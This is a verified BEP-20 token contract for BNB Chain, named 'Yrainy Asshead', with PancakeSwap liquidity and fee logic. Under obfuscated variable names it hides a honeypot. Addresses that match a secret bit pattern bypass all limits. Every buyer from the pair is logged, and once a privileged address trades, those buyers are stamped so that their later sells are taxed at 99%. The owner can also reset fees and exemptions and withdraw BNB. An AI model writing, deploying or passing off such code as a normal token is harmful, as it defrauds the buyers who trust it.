/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract YrainyAsshead is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Yrainy Asshead ";
    string constant _symbol = "YrainyAsshead";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private burnWalletLaunchedMin;
    mapping(address => bool) private botsExemptReceiverWalletLaunchedLiquidity;
    mapping(address => bool) private liquidityMarketingMaxFeeBotsModeTeam;
    mapping(address => bool) private tradingBotsIsAuto;
    mapping(address => uint256) private modeFeeMarketingIsTradingLimitExempt;
    mapping(uint256 => address) private swapExemptMaxTrading;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private exemptAutoBuyMax = 0;
    uint256 private maxSellBurnFeeAuto = 8;

    //SELL FEES
    uint256 private tradingWalletIsBuyAutoFee = 0;
    uint256 private botsSellIsReceiver = 8;

    uint256 private botsLaunchedSellFee = maxSellBurnFeeAuto + exemptAutoBuyMax;
    uint256 private walletBuyFeeLiquidity = 100;

    address private burnLiquidityTxSwapLimit = (msg.sender); // auto-liq address
    address private walletLaunchedMarketingMode = (0x49BE9eb78883FdB8fB06b5D6FfffE6FCc75DBCBf); // marketing address
    address private swapReceiverLaunchedLiquidity = DEAD;
    address private liquidityTeamWalletBots = DEAD;
    address private swapTeamExemptIsTxMinMax = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private teamLimitMinReceiver;
    uint256 private botsBuyLaunchedAutoSwapWalletTx;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private sellExemptAutoMinReceiverLaunchedBots;
    uint256 private burnFeeTeamIsReceiver;
    uint256 private botsBurnIsTrading;
    uint256 private receiverLimitBuyMax;
    uint256 private sellBotsLimitLaunched;

    bool private receiverLimitLiquidityFee = true;
    bool private tradingBotsIsAutoMode = true;
    bool private liquidityLaunchedFeeTrading = true;
    bool private modeMarketingIsMin = true;
    bool private receiverIsMaxLiquidity = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private buyAutoExemptTx = _totalSupply / 1000; // 0.1%

    
    uint256 private teamMarketingBotsWalletLiquidityAutoSwap;
    uint256 private marketingFeeMinSellAutoBotsWallet;
    uint256 private buyMinWalletModeBurnIs;
    bool private tradingIsSwapTx;
    bool private buyTxLaunchedMax;
    uint256 private walletTeamMarketingMin;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        sellExemptAutoMinReceiverLaunchedBots = true;

        burnWalletLaunchedMin[msg.sender] = true;
        burnWalletLaunchedMin[address(this)] = true;

        botsExemptReceiverWalletLaunchedLiquidity[msg.sender] = true;
        botsExemptReceiverWalletLaunchedLiquidity[0x0000000000000000000000000000000000000000] = true;
        botsExemptReceiverWalletLaunchedLiquidity[0x000000000000000000000000000000000000dEaD] = true;
        botsExemptReceiverWalletLaunchedLiquidity[address(this)] = true;

        liquidityMarketingMaxFeeBotsModeTeam[msg.sender] = true;
        liquidityMarketingMaxFeeBotsModeTeam[0x0000000000000000000000000000000000000000] = true;
        liquidityMarketingMaxFeeBotsModeTeam[0x000000000000000000000000000000000000dEaD] = true;
        liquidityMarketingMaxFeeBotsModeTeam[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return launchedAutoSwapMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return launchedAutoSwapMarketing(sender, recipient, amount);
    }

    function launchedAutoSwapMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = marketingTeamBotsMinLimitIs(sender) || marketingTeamBotsMinLimitIs(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                walletReceiverBotsLiquidityFee();
            }
            if (!bLimitTxWalletValue) {
                isTradingSellLaunched(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return limitBurnWalletIsTeam(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(receiverLimitLiquidityFee, "Trading is not active");
        }

        if (!Administration[sender] && !burnWalletLaunchedMin[sender] && !burnWalletLaunchedMin[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || liquidityMarketingMaxFeeBotsModeTeam[sender] || liquidityMarketingMaxFeeBotsModeTeam[recipient], "Max TX Limit has been triggered");

        if (teamTradingBuyExemptSwap()) {receiverTradingLimitTxMinLiquidity();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = marketingBuyLaunchedSell(sender) ? receiverTxSellBuy(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function limitBurnWalletIsTeam(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function marketingBuyLaunchedSell(address sender) internal view returns (bool) {
        return !botsExemptReceiverWalletLaunchedLiquidity[sender];
    }

    function maxSellMinAuto(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            botsLaunchedSellFee = botsSellIsReceiver + tradingWalletIsBuyAutoFee;
            return sellLiquiditySwapIs(sender, botsLaunchedSellFee);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsLaunchedSellFee = maxSellBurnFeeAuto + exemptAutoBuyMax;
            return botsLaunchedSellFee;
        }
        return sellLiquiditySwapIs(sender, botsLaunchedSellFee);
    }

    function receiverTxSellBuy(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(maxSellMinAuto(sender, receiver == uniswapV2Pair)).div(walletBuyFeeLiquidity);

        if (tradingBotsIsAuto[sender] || tradingBotsIsAuto[receiver]) {
            feeAmount = amount.mul(99).div(walletBuyFeeLiquidity);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function marketingTeamBotsMinLimitIs(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function sellLiquiditySwapIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = modeFeeMarketingIsTradingLimitExempt[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function isTradingSellLaunched(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        swapExemptMaxTrading[exemptLimitValue] = addr;
    }

    function walletReceiverBotsLiquidityFee() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (modeFeeMarketingIsTradingLimitExempt[swapExemptMaxTrading[i]] == 0) {
                    modeFeeMarketingIsTradingLimitExempt[swapExemptMaxTrading[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletLaunchedMarketingMode).transfer(amountBNB * amountPercentage / 100);
    }

    function teamTradingBuyExemptSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    receiverIsMaxLiquidity &&
    _balances[address(this)] >= buyAutoExemptTx;
    }

    function receiverTradingLimitTxMinLiquidity() internal swapping {
        uint256 amountToLiquify = buyAutoExemptTx.mul(exemptAutoBuyMax).div(botsLaunchedSellFee).div(2);
        uint256 amountToSwap = buyAutoExemptTx.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsLaunchedSellFee.sub(exemptAutoBuyMax.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(exemptAutoBuyMax).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(maxSellBurnFeeAuto).div(totalETHFee);

        payable(walletLaunchedMarketingMode).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                burnLiquidityTxSwapLimit,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityLaunchedFeeTrading() public view returns (bool) {
        return liquidityLaunchedFeeTrading;
    }
    function setLiquidityLaunchedFeeTrading(bool a0) public onlyOwner {
        if (liquidityLaunchedFeeTrading == tradingBotsIsAutoMode) {
            tradingBotsIsAutoMode=a0;
        }
        liquidityLaunchedFeeTrading=a0;
    }

    function getLiquidityMarketingMaxFeeBotsModeTeam(address a0) public view returns (bool) {
        if (liquidityMarketingMaxFeeBotsModeTeam[a0] == burnWalletLaunchedMin[a0]) {
            return tradingBotsIsAutoMode;
        }
            return liquidityMarketingMaxFeeBotsModeTeam[a0];
    }
    function setLiquidityMarketingMaxFeeBotsModeTeam(address a0,bool a1) public onlyOwner {
        liquidityMarketingMaxFeeBotsModeTeam[a0]=a1;
    }

    function getModeMarketingIsMin() public view returns (bool) {
        if (modeMarketingIsMin != modeMarketingIsMin) {
            return modeMarketingIsMin;
        }
        if (modeMarketingIsMin != tradingBotsIsAutoMode) {
            return tradingBotsIsAutoMode;
        }
        return modeMarketingIsMin;
    }
    function setModeMarketingIsMin(bool a0) public onlyOwner {
        if (modeMarketingIsMin != receiverIsMaxLiquidity) {
            receiverIsMaxLiquidity=a0;
        }
        if (modeMarketingIsMin == liquidityLaunchedFeeTrading) {
            liquidityLaunchedFeeTrading=a0;
        }
        if (modeMarketingIsMin != liquidityLaunchedFeeTrading) {
            liquidityLaunchedFeeTrading=a0;
        }
        modeMarketingIsMin=a0;
    }

    function getMaxSellBurnFeeAuto() public view returns (uint256) {
        return maxSellBurnFeeAuto;
    }
    function setMaxSellBurnFeeAuto(uint256 a0) public onlyOwner {
        maxSellBurnFeeAuto=a0;
    }

    function getLiquidityTeamWalletBots() public view returns (address) {
        return liquidityTeamWalletBots;
    }
    function setLiquidityTeamWalletBots(address a0) public onlyOwner {
        if (liquidityTeamWalletBots == swapReceiverLaunchedLiquidity) {
            swapReceiverLaunchedLiquidity=a0;
        }
        liquidityTeamWalletBots=a0;
    }

    function getBotsExemptReceiverWalletLaunchedLiquidity(address a0) public view returns (bool) {
        if (botsExemptReceiverWalletLaunchedLiquidity[a0] != botsExemptReceiverWalletLaunchedLiquidity[a0]) {
            return liquidityLaunchedFeeTrading;
        }
            return botsExemptReceiverWalletLaunchedLiquidity[a0];
    }
    function setBotsExemptReceiverWalletLaunchedLiquidity(address a0,bool a1) public onlyOwner {
        botsExemptReceiverWalletLaunchedLiquidity[a0]=a1;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}